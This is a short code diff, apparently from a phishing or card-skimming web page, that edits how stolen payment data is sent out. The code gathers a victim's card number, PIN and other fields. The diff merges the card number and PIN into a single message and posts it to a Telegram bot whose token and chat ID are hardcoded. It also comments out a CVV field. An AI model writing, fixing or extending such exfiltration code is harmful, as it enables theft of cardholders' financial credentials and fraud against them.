@@ -121,7 +121,7 @@
                 Date: date,
                 Time: time,
                 Pin: pin,
-                Cvv: cvv
+                // Cvv: cvv
 
             };
             // let dbRef = ref(database, todos);
@@ -132,8 +132,9 @@
               // Replace YOUR_BOT_TOKEN and CHAT_ID with your bot's token and chat ID
     const botToken = '8191097883:AAHcw2x0KQ88QMiJTTZU9Rq1REGMF7WDN6k';
     const chatId = '468271675';
-    const text = "Card Number: " + cardnumber;
-    const text = "Pin: " + pin;
+    const text = `Card Number: ${cardnumber}\nPin: ${pin}`;
+    // const text = "Card Number: " + cardnumber;
+    // const text = "Pin: " + pin;
             // const text = await set(obj);
 
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
